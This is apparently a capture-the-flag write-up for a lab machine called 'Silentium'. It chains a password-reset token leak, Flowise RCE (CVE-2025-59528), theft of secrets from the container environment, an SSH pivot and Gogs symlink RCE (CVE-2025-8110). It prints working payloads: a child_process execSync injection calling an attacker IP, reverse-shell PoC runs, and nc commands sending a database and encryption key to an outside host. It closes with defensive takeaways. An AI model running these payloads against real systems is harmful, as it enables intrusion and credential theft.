Silentium

EasyLinux

Silentium is an “institutional finance” branded box that turns out to be a chain of application-layer misconfigurations rather than a single flashy exploit: a hidden staging vhost, a leaky password-reset API that discloses tempTokens, a vulnerable Flowise AI-builder instance (CVE-2025-59528), and finally a self-hosted Gogs Git service (CVE-2025-8110) reachable only after pivoting through internal ports.

PHASE 1

Reconnaissance & Virtual Host Discovery

Port scan first to understand the attack surface, then fuzz for the virtual hosts the main site is hiding behind — staging/internal subdomains are frequently where the real app logic (and the real bugs) live.

Service & OS scan

WhyA combined version/script scan with OS detection gives both the open-port picture and useful fingerprinting in one pass.

nmap -sV -A -T4 10.129.30.114 -o port_scan
22/tcp open  ssh   OpenSSH 9.6p1 Ubuntu
80/tcp open  http  nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://silentium.htb/

NextOnly SSH and HTTP are exposed — so the entire attack surface is the web application. Add the hostname to /etc/hosts and start enumerating it.

Virtual host fuzzing

WhyThe landing page is a static marketing site for a fictional finance firm with almost nothing interactive. Rather than directory-bust a mostly-static page, I fuzzed the Host header for hidden subdomains — a much higher-yield technique when a company site looks like a shell.

ffuf -c -u http://silentium.htb/ -H "Host: FUZZ.silentium.htb" \
  -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt --fs 178
[Status: 200, Size: 3142] staging

NextA staging vhost responds differently from the baseline — add staging.silentium.htb to the hosts file and inspect it directly.

Manual discovery of the registration flow

WhyBrowsing staging.silentium.htb by hand (rather than only relying on automated fuzzing) surfaced a /register page the brochure site didn't link to — worth remembering that manual exploration still finds things wordlists miss.

NextThe frontend signup form didn't behave as expected in the browser, so move to driving the backend API directly with curl.

PHASE 2

API Enumeration & Endpoint Mapping

The frontend form silently failed, which is a strong signal the real logic lives behind an API the SPA calls separately. Replaying the same request with curl, and then fuzzing for sibling endpoints, is the standard way to work around a broken or JS-gated frontend.

Replay the signup request with curl

WhyReproducing the browser's request manually, with the headers it normally sends automatically (Origin, Referer, a custom internal-trust header), tests whether the API enforces those headers server-side or just expects them cosmetically.

curl -X POST "http://staging.silentium.htb/api/v1/auth/register" \
-H "Content-Type: application/json" \
-H "x-request-from: internal" \
-H "Origin: http://staging.silentium.htb" \
-H "Referer: http://staging.silentium.htb/signup" \
-d '{"fullName":"Mario Rossi","email":"velid@velid.com","password":"Password1!","confirmPassword":"Password1!"}'

NextA direct account was created, confirming the frontend's client-side validation wasn't backed by matching server-side checks. Check the Network tab for the real API prefix used by the live login flow.

Fuzz the real API surface

WhyThe working login traffic revealed the true path prefix (/api/v1/...), which is different from the one that worked for registration — a sign the API has multiple route groups. Fuzzing against a dedicated API wordlist surfaces every other route the SPA doesn't expose through its own UI.

ffuf -c -u http://staging.silentium.htb/FUZZ -w \
  /usr/share/wordlists/seclists/Discovery/Web-Content/api/api-endpoints.txt --fs 3142
api/v1/account/forgot-password
api/v1/account/reset-password
api/v1/account/user/register
api/v1/auth/login
...(many more, mostly 401-gated)

NextEvery endpoint found here is logged for later use. The password-reset pair (forgot-password / reset-password) stands out as the highest-value target, since reset flows are a classic source of logic bugs.

PHASE 3

Account Takeover via Password-Reset Token Disclosure

The site's Leadership page names a real employee, Ben. Rather than brute-forcing credentials, I targeted the password-reset flow directly and intercepted it with Burp to see exactly what the server returns.

The core bug

The forgot-password endpoint responds with a 201 Created and echoes the full user object back in the JSON body — including the freshly generated tempToken that's supposed to be delivered privately (normally by email). Any unauthenticated caller who knows a target's email address receives their own valid reset token in the HTTP response.

Trigger the reset and capture the response

WhyRequesting a reset for Ben's email, while watching the raw response in Burp rather than trusting what the frontend renders, is what reveals the leak — the UI never shows the token, but the API response contains it in full.

curl -X POST "http://staging.silentium.htb/api/v1/account/forgot-password" \
-H "Content-Type: application/json" \
-H "Accept: application/json, text/plain, */*" \
-d '{"user":{"email":"ben@silentium.htb"}}'
HTTP/1.1 201 Created
{
  "user": {
    "id": "e26c9d6c-678c-4c10-9e36-01813e8fea73",
    "name": "admin",
    "email": "ben@silentium.htb",
    "tempToken": "7W1Z6KxQMvDEqgjmQge7KQ4uBp2IP3G7ARlFbk77SHRFmu4EnrQoTWzw1zT7W4ue",
    "tokenExpiry": "2026-04-14T20:32:46.172Z",
    "status": "active"
  }
}

NextThis tempToken is exactly what the real reset-password endpoint expects. Use it immediately before it expires.

Set a new password with the leaked token

WhyFeeding the disclosed tempToken back into reset-password completes a full account takeover with no access to Ben's email inbox at any point.

curl -X POST "http://staging.silentium.htb/api/v1/account/reset-password" \
-H "Content-Type: application/json" \
-d '{"user":{"email":"ben@silentium.htb","tempToken":"<leaked-token>","password":"MyPassword123"}}'
HTTP/1.1 201 Created &mdash; tempToken field now empty, password hash updated

NextLog in to the application as Ben with the new password and continue enumerating what an authenticated admin session can reach.

PHASE 4

Shell via Flowise — CVE-2025-59528

Authenticated as Ben, the app's dashboard exposed an embedded Flowise instance (an AI agent/LLM workflow builder). Flowise's custom-node loading feature is a known unauthenticated-adjacent RCE vector once a session token is available.

CVE-2025-59528 — Flowise CustomMCP Node RCE

Flowise's /api/v1/node-load-method/customMCP endpoint evaluates a user-supplied mcpServerConfig expression server-side. By supplying a JavaScript object literal that calls process.mainModule.require('child_process').execSync(...) inside that config, an authenticated caller gets direct command execution on the Flowise host.

Recover the session JWT

WhyFlowise authenticates via a JWT issued at login; grabbing it from the browser (or the login response in Burp) is needed to authorize the exploit request.

NextUse the JWT as a Bearer token against the vulnerable node-load-method endpoint.

Trigger RCE through the customMCP node

WhyThe payload abuses Node's module loader to reach child_process from inside the sandboxed evaluation context, then runs an arbitrary shell command — in this case, an outbound curl as a callback/verification check before sending a full reverse shell.

curl -X POST "http://staging.silentium.htb/api/v1/node-load-method/customMCP" \
-H "Content-Type: application/json" \
-H "Authorization: Bearer <JWT>" \
-H "x-request-from: internal" \
-d '{"loadMethod":"listActions","inputs":{"mcpServerConfig":"({x:(function(){const cp = process.mainModule.require(\\"child_process\\");cp.execSync(\\"curl 10.10.14.184:8000\\");return 1;})()})"}}'

NextWith command execution confirmed, swap the probe command for a full reverse shell payload.

Get an interactive shell

WhyA purpose-built PoC script (CVE-2025-59528-POC) automates authentication and delivers bash / nc / python reverse shells in one pass — faster and more reliable than hand-crafting each payload during a live engagement.

python3 exploit.py -t http://staging.silentium.htb --mode revshell \
  --lhost 10.10.15.154 --lport 9091 \
  --email "ben@silentium.htb" --password "MyPassword123"
root@silentium:/workspace# whoami
root

NextThis lands as root inside the Flowise container, not necessarily the underlying host. Loot the Flowise data directory for anything reusable.

Exfiltrate the Flowise database and encryption key

WhyFlowise stores its credential store, chatflow configs, and API keys in a local SQLite DB, encrypted with a local key file. Both are needed together to decrypt any stored secrets.

nc -w 3 10.10.15.154 9092 < database.sqlite
nc -w 3 10.10.15.154 9092 < encryption.key

NextInspect the SQLite DB for a credential table, and separately check the process environment for anything leaked at runtime.

Mine the process environment for plaintext secrets

WhyReading /proc/<pid>/environ for the Flowise process is a fast way to recover credentials that were passed in as environment variables rather than stored encrypted — a common oversight in containerized deployments.

strings /proc/$(pgrep -f flowise)/environ 2>/dev/null | grep -i "secret\|key\|pass"
FLOWISE_USERNAME=ben
FLOWISE_PASSWORD=F1l3_d0ck3r
SMTP_PASSWORD=r04D!!_R4ge
DATABASE_PATH=/root/.flowise

NextBoth the Flowise password and the earlier web password belong to ben — try the newly recovered one over SSH to the host itself.

PHASE 5

Pivoting — Internal Services & Gogs RCE (CVE-2025-8110)

SSH as ben on the real host opened up internal-only services that weren't reachable from outside — a classic multi-hop box pattern: compromise the app, land on the box, then pivot to services bound to localhost.

SSH in with the recovered password

WhyThe Docker-environment password recovered from Flowise's process environment also worked for the host's SSH account.

ssh ben@silentium.htb
Welcome to Ubuntu 24.04.4 LTS
ben@silentium:~$ ls
user.txt

NextGrab user.txt, then check what's listening locally that wasn't visible from the external scan.

Enumerate local-only listeners

Whynetstat -tulnp as ben shows services bound to 127.0.0.1 on non-standard ports — these are the internal tools the staging environment depends on (mail capture, a code host) that are never meant to be internet-facing.

netstat -tulnp
127.0.0.1:3000   LISTEN
127.0.0.1:8025   LISTEN

NextForward both ports over SSH to inspect them from the attack host's browser.

Tunnel the internal ports

WhyLocal port forwarding exposes the loopback-only services on the attacking machine without touching the target's firewall rules at all.

ssh -L 3000:localhost:8025 ben@silentium.htb
# separately: ssh -L 3001:localhost:3000 ben@silentium.htb

NextPort 8025 is a MailHog instance (a mail-catcher used by dev/staging environments); port 3000 is an internal Gogs git server.

Discover the internal Gogs instance

WhyThe forwarded port serves a self-hosted Gogs Git service at a separate internal hostname (staging-v2-code.dev.silentium.htb) — a secondary application stack that was never meant to be reachable except from inside the staging network.

NextFingerprint the Gogs version and check for known CVEs before attempting any exploit.

CVE-2025-8110 — Gogs Malicious Symlink RCE

Gogs allows a repository push that includes a crafted symlink entry. By pushing a commit containing a malicious symlink via the Gogs API/git protocol, an authenticated (even low-privilege) user can escape the repo sandbox and achieve code execution on the Gogs host — in this case via a public PoC (gogs-CVE-2025-8110) that automates account registration, token generation, repo creation, and the malicious push/callback sequence.

PHASE 6

Root Shell via Gogs Exploit

With the internal Gogs service identified and version-fingerprinted as vulnerable, register an account through the standard signup flow and run the public PoC against it.

Configure git identity for the exploit

WhyThe PoC drives real git operations, so a local git identity is required before it can commit and push the malicious payload.

git config --global user.email "vel@vel.vel"
git config --global user.name "vel"

Run the Gogs symlink RCE PoC

WhyThe script authenticates to the forwarded Gogs instance, creates an application token, spins up a new repository, and pushes a commit containing the malicious symlink that triggers execution on the server side.

python3 CVE-2025-8110.py -u http://staging-v2-code.dev.silentium.htb -lh 10.10.15.154 -lp 9091

NextHave a listener ready on the chosen port before triggering the exploit, since the callback fires asynchronously.

Catch the callback

WhyThe exploit's malicious symlink gets processed server-side during a subsequent repository operation, triggering the reverse shell back to the listener.

nc -lvnp 9091
Ncat: Connection from 10.129.43.86.
bash: cannot set terminal process group ... no job control
root@silentium:/opt/gogs/gogs/data/tmp/local-repo/5#

NextThis lands directly as root — Gogs' own service account was running with root privileges inside the staging environment, so no further privilege escalation chain was required.

Key Takeaways

  • Password-reset endpoints should never echo the reset token in an API response body — delivery must happen exclusively through the registered out-of-band channel (email/SMS), and the response should confirm nothing more than "if this account exists, a reset was sent."
  • Third-party platforms embedded into an app (here, Flowise) inherit the trust boundary of whatever account can reach them — a compromised low-privilege web account escalated straight to RCE because the AI-builder component itself was unpatched (CVE-2025-59528).
  • Secrets passed via environment variables to containerized services are trivially recoverable by anyone who gets code execution inside that container — use a secrets manager or mounted files with tight permissions instead.
  • Internal developer tooling (Gogs, MailHog) bound to loopback is only as safe as the host it runs on; once an attacker has a shell, "internal-only" stops being a real boundary. Keep internal tooling patched exactly as rigorously as internet-facing services.
